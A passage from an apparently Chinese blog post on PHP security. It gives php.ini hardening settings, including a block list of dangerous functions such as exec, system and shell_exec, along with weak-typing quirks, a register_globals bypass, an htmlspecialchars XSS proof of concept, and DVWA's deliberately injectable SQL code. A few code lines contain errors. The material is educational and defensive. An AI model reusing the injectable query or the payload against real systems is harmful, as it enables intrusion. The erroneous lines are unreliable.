@@ -1,0 +1,1432 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="代码审计,php,web安全,安全编码规范,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="BLOG of little potato" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="php天生支持web应用的开发，以其简单易学，开发效率高而备受喜爱。使其占据了大片的市场。但是php本身的安全问题却一直备受诟病，以及编写不规范的php程序，使得web应用漏洞百出，这篇文章从配置文件和代码编写等角度总结前人的经验以及自己的感悟体会，但是不会十分细致的讲解每个漏洞的具体原理，也不会过多的涉及php语法讲解（除了部分关键函数），所以最好能够有一定php基础和对OWASP top10">
+<meta name="keywords" content="代码审计,php,web安全,安全编码规范">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈php安全">
+<meta property="og:url" content="http://yoursite.com/2018/09/05/浅谈php安全/index.html">
+<meta property="og:site_name" content="BLOG of little potato">
+<meta property="og:description" content="php天生支持web应用的开发，以其简单易学，开发效率高而备受喜爱。使其占据了大片的市场。但是php本身的安全问题却一直备受诟病，以及编写不规范的php程序，使得web应用漏洞百出，这篇文章从配置文件和代码编写等角度总结前人的经验以及自己的感悟体会，但是不会十分细致的讲解每个漏洞的具体原理，也不会过多的涉及php语法讲解（除了部分关键函数），所以最好能够有一定php基础和对OWASP top10">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/myimages/php/1.jpg">
+<meta property="og:updated_time" content="2018-12-05T14:58:05.896Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="浅谈php安全">
+<meta name="twitter:description" content="php天生支持web应用的开发，以其简单易学，开发效率高而备受喜爱。使其占据了大片的市场。但是php本身的安全问题却一直备受诟病，以及编写不规范的php程序，使得web应用漏洞百出，这篇文章从配置文件和代码编写等角度总结前人的经验以及自己的感悟体会，但是不会十分细致的讲解每个漏洞的具体原理，也不会过多的涉及php语法讲解（除了部分关键函数），所以最好能够有一定php基础和对OWASP top10">
+<meta name="twitter:image" content="http://yoursite.com/myimages/php/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/05/浅谈php安全/">
+
+
+
+
+
+  <title>浅谈php安全 | BLOG of little potato</title>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?47d7b880e7f466d86f6a2755e80a6337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BLOG of little potato</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/05/浅谈php安全/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="little potato">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BLOG of little potato">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">浅谈php安全</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-05T23:49:04+08:00">
+                Sep 5 2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index">
+                    <span itemprop="name">php</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/09/05/浅谈php安全/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/09/05/浅谈php安全/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>php天生支持web应用的开发，以其简单易学，开发效率高而备受喜爱。使其占据了大片的市场。但是php本身的安全问题却一直备受诟病，以及编写不规范的php程序，使得web应用漏洞百出，这篇文章从配置文件和代码编写等角度总结前人的经验以及自己的感悟体会，但是不会十分细致的讲解每个漏洞的具体原理，也不会过多的涉及php语法讲解（除了部分关键函数），所以最好能够有一定php基础和对OWASP top10有所了解，最后向前辈致敬。<br><a id="more"></a></p>
+</blockquote>
+<h1 id="请充分了解你的php"><a href="#请充分了解你的php" class="headerlink" title="请充分了解你的php"></a>请充分了解你的php</h1><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 注意到以下的文件结构在新版本php或者不同的发行版中略有不同，就好比在ubuntu18.04中安装php7就和下面的文件结构有较大的差别，所以下面的文件仅仅作为一个apache的架构参考。</span><br><span class="line">Root：/var/www/html</span><br><span class="line">默认Web服务：Apache（可以使用Lighttpd或Nginx代替）</span><br><span class="line">默认PHP配置文件：/etc/php.ini</span><br><span class="line">默认PHP Extensions配置目录：/etc/php.d/</span><br><span class="line">PHP安全配置样例文件：/etc/php.d/security.ini（需要使用文本编辑器创建这个文件）</span><br><span class="line">php 版本： php -v</span><br><span class="line">查看当前PHP所编译 ： php -m</span><br></pre></td></tr></table></figure>
+<h3 id="敏感配置"><a href="#敏感配置" class="headerlink" title="敏感配置"></a>敏感配置</h3><blockquote>
+<p>以下是一些常见的配置举例，更多请查看：<a href="http://php.net/manual/zh/ini.core.php#ini.variables-order" target="_blank" rel="noopener">http://php.net/manual/zh/ini.core.php#ini.variables-order</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># 不在请求头中泄露php信息</span><br><span class="line">expose_php=Off   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 不回显php错误（包括运行错误时和启动时错误），但是进行错误记录</span><br><span class="line">play_errors=Off  </span><br><span class="line">display_startup_errors=off</span><br><span class="line">log_errors=On</span><br><span class="line">error_log=/var/log/httpd/php_scripts_error.log</span><br><span class="line"></span><br><span class="line"># 文件上传开启与否和最大上传文件限制</span><br><span class="line">file_uploads=On</span><br><span class="line">upload_max_filesize=1M</span><br><span class="line"></span><br><span class="line"># 控制最大post数据</span><br><span class="line">post_max_size=1M   #注意到要比upload_max_filesize大，否则后者失效</span><br><span class="line"></span><br><span class="line"># 关闭远程代码执行</span><br><span class="line">allow_url_fopen=Off</span><br><span class="line">allow_url_include=Off</span><br><span class="line"></span><br><span class="line"># 关闭全局注册变量，不过默认5.x版本的php是off</span><br><span class="line">register_globals=off</span><br><span class="line"></span><br><span class="line"># 关于安全模式和粗暴的魔术引号过滤，注意到save_mode模式在php5.3以上版本，safe_mode被弃用，在php5.4以上版本，则将此特性完全去除了。</span><br><span class="line">safe_mode=On</span><br><span class="line">safe_mode_include_dir = D:/phpstudy/www/include/</span><br><span class="line">magic_quotes_gpc=Off   #如果开启了这个，然后在php应用中使用addslashes()过滤输入会造成双重转义，使得过滤无济于事，遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br><span class="line">magic_quotes_runtime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 资源管理防止过分消耗服务器资源</span><br><span class="line">max_execution_time = 30</span><br><span class="line">max_input_time = 30</span><br><span class="line">memory_limit = 40M</span><br><span class="line"></span><br><span class="line"># 禁用危险函数</span><br><span class="line">disable_functions = </span><br><span class="line">phpinfo,eval,passthru,assert,exec,system,ini_set,ini_get,get_included_files,</span><br><span class="line">get_defined_functions,get_defined_constants,get_defined_vars,</span><br><span class="line">glob,``,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,</span><br><span class="line">ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,</span><br><span class="line">symlink,popepassthru,stream_socket_server,fsocket,fsockopen</span><br><span class="line"></span><br><span class="line"># 限制php访问文件系统</span><br><span class="line">open_basedir=&apos;/var/www/html/&apos;;......;......</span><br><span class="line"></span><br><span class="line"># session保存路径</span><br><span class="line">session.save_path=&quot;/var/lib/php/session&quot;</span><br><span class="line"></span><br><span class="line"># 上传文件默认路径</span><br><span class="line">upload_tmp_dir=&quot;/var/lib/php/upload&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="关于危险函数"><a href="#关于危险函数" class="headerlink" title="关于危险函数"></a>关于危险函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 特殊符号</span><br><span class="line">``:反引号运算符在激活了安全模式或者关闭了 shell_exec() 时是无效的，同时与其它某些语言不同，反引号不能在双引号字符串中使用。。否则将会当作shell命令执行，执行效果等同于shell_exec()。</span><br><span class="line"></span><br><span class="line"># 文件操作</span><br><span class="line">http://php.net/manual/zh/ref.filesystem.php</span><br><span class="line"></span><br><span class="line"># 全局信息，配置等</span><br><span class="line">http://php.net/manual/zh/ref.info.php</span><br><span class="line"></span><br><span class="line"># 程序执行</span><br><span class="line">http://php.net/manual/zh/book.exec.php</span><br></pre></td></tr></table></figure>
+<h1 id="不要过分相信php"><a href="#不要过分相信php" class="headerlink" title="不要过分相信php"></a>不要过分相信php</h1><h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><p>前人之叙述比较完备，在这就不赘余，仅仅做个汇总。同样还可以参看官网给出的类型表<a href="http://php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP 类型比较表</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0==&apos;0&apos;		//true</span><br><span class="line">0 == &apos;abcdefg&apos;	//true</span><br><span class="line">1 == &apos;1abcdef&apos;	//true</span><br><span class="line">null==false     //true</span><br><span class="line">123==&apos;123&apos;      //true </span><br><span class="line"></span><br><span class="line">//哈希比较</span><br><span class="line">&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true</span><br><span class="line">&quot;0e123456abc&quot;==&quot;0e1dddada&quot;	//false</span><br><span class="line">&quot;0e1abc&quot;==&quot;0&quot;     //true</span><br><span class="line"></span><br><span class="line">&quot;0x1e240&quot;==&quot;123456&quot;		//true</span><br><span class="line">&quot;0x1e240&quot;==123456		//true</span><br><span class="line"></span><br><span class="line">var_dump(intval(&apos;2&apos;))	//2</span><br><span class="line">var_dump(intval(&apos;3abcd&apos;))	//3</span><br><span class="line">var_dump(intval(&apos;abcd&apos;))	//0</span><br><span class="line"></span><br><span class="line">//任意两个array,MD5相等</span><br><span class="line">var_dump(md5($array1)==var_dump($array2));	//true</span><br><span class="line"></span><br><span class="line">//case 自转换，以下代码输出i is less than 3 but not negative</span><br><span class="line">$i =&quot;2abc&quot;;</span><br><span class="line">switch ($i) &#123;</span><br><span class="line">case 0:</span><br><span class="line">case 1:</span><br><span class="line">case 2:</span><br><span class="line">    echo &quot;i is less than 3 but not negative&quot;;</span><br><span class="line">    break;</span><br><span class="line">case 3:</span><br><span class="line">    echo &quot;i is 3&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//in_array的缺陷，array_search</span><br><span class="line">$array=[0,1,2,&apos;3&apos;];</span><br><span class="line">var_dump(in_array(&apos;abc&apos;, $array));  //true</span><br><span class="line">var_dump(in_array(&apos;1bc&apos;, $array));	//true</span><br><span class="line"></span><br><span class="line">//strcmp在php5.x个版本后有些特性不太同，所以遇到的时候具体讨论</span><br></pre></td></tr></table></figure></p>
+<h3 id="全局注册变量"><a href="#全局注册变量" class="headerlink" title="全局注册变量"></a>全局注册变量</h3><p>如果已经弃用的 register_globals 指令被设置为 on 那么局部变量也将在脚本的全局作用域中可用。例如， $_POST[‘foo’] 也将以 $foo 的形式存在。这将会造成一些变量覆盖，条件判断绕过。以下是简化的全局变量认证绕过模型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(authenticated_user())&#123;</span><br><span class="line">    $authorized=<span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($authorized)&#123;</span><br><span class="line">    <span class="keyword">do</span> something......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>对于以上的绕过，我们可以有以下的规避措施：<br>(1) php.ini <code>register_globals=off</code><br>(2) 在每次判断前初始化变量，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$authorized=<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(authenticated_user())&#123;</span><br><span class="line">    $authorized=<span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($authorized)&#123;</span><br><span class="line">    <span class="keyword">do</span> something......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="一些常出现的“安全”函数"><a href="#一些常出现的“安全”函数" class="headerlink" title="一些常出现的“安全”函数"></a>一些常出现的“安全”函数</h3><h6 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a><a href="http://php.net/manual/zh/function.strip-tags.php" target="_blank" rel="noopener"><code>strip_tags</code></a></h6><p>该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。但是记住光光去除标签，但是不去除属性，那么在一些可以引入js的代码的属性标签里仍旧会造成xss。具体查看参照</p>
+<h6 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener"><code>htmlspecialchars</code></a></h6><p>这个函数多用来对xss的过滤上，但是注意到这个函数对<code>\</code>和<code>&#39;</code>是不敏感的，本身不会处理,要想转义<code>&#39;</code>需要加入<code>ENT_QUOTES</code>参数，否则仍有可能会出现xss。举例如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_GET[<span class="string">"name"</span>];</span><br><span class="line">$name = htmlspecialchars($name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;input type=<span class="string">'text'</span> value=<span class="string">'&lt;?php echo $name?&gt;;'</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>poc=<code>?name=&#39;onmouseover=&#39;alert(1)</code>，则在鼠标悬停在输入框上的时候会触发xss，笔者测试的时候IE可以弹窗，而chrome的xss过滤器直接把这个xss语句识别出了，拒绝访问。但是可以看出在绕过浏览器xss filter的情况下仍旧会导致xss。</p>
+<h6 id="htmlentities"><a href="#htmlentities" class="headerlink" title="htmlentities"></a><a href="http://php.net/manual/zh/function.htmlentities.php" target="_blank" rel="noopener"><code>htmlentities</code></a></h6><h6 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a><a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="noopener"><code>escapeshellarg</code></a></h6><p>将用户输入进行单引号包含，使其成为真正的字符串，而不会造成执行任意命令的不可控情况。</p>
+<h6 id="escaoeshellcmd"><a href="#escaoeshellcmd" class="headerlink" title="escaoeshellcmd"></a><a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener"><code>escaoeshellcmd</code></a></h6><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。</p>
+<h6 id="is-uploaded-file"><a href="#is-uploaded-file" class="headerlink" title="is_uploaded_file"></a><a href="http://php.net/manual/zh/function.is-uploaded-file.php" target="_blank" rel="noopener"><code>is_uploaded_file</code></a></h6><p>该函数用来检查文件是否正真的由用户传的，避免对非用户传的文件进行操作，从而泄露本地信息。</p>
+<h6 id="intval"><a href="#intval" class="headerlink" title="intval"></a><a href="http://php.net/manual/zh/function.intval.php" target="_blank" rel="noopener"><code>intval</code></a></h6><p>将输入转换成整数，有时被用来抵抗sqli。</p>
+<h6 id="fgetss"><a href="#fgetss" class="headerlink" title="fgetss"></a><a href="http://php.net/manual/zh/function.fgetss.php" target="_blank" rel="noopener"><code>fgetss</code></a></h6><p>这个函数可以从文件操作符中取出一行并且过滤掉html标签</p>
+<h6 id="quotemeta"><a href="#quotemeta" class="headerlink" title="quotemeta"></a><a href="http://php.net/manual/zh/function.quotemeta.php" target="_blank" rel="noopener"><code>quotemeta</code></a></h6><h5 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a><a href="http://php.net/manual/zh/function.stripslashes.php" target="_blank" rel="noopener"><code>stripslashes</code></a></h5><h5 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a><a href="http://php.net/manual/zh/function.str-replace.php" target="_blank" rel="noopener"><code>str_replace</code></a></h5><p>str_replace函数是极其不安全的，因为很多时候可以使用双写绕过替换规则</p>
+<h3 id="php内置协议-伪协议"><a href="#php内置协议-伪协议" class="headerlink" title="php内置协议(伪协议)"></a>php内置协议(伪协议)</h3><p>以下伪协议在很多绕过场景下发挥着举足轻重的作用，如后面提到的文件包含file://协议绕过，以及最近才提出的phar协议对象注入，我们可以在不存在可控unserialization（）函数的情况下利用phar反序列化对象，实现对象注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html  访问本地文件系统</span><br><span class="line">ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLs</span><br><span class="line">data://  数据流</span><br><span class="line">http:// — 访问 HTTP(s) URLs</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — Data (RFC 2397)</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP Archive</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — Audio streams</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p>
+<h1 id="向DVWA学习php安全的代码编写"><a href="#向DVWA学习php安全的代码编写" class="headerlink" title="向DVWA学习php安全的代码编写"></a>向DVWA学习php安全的代码编写</h1><blockquote>
+<p>以下样例来自于DVWA v1.9版本</p>
+</blockquote>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul>
+<li>Low level</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Get values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br 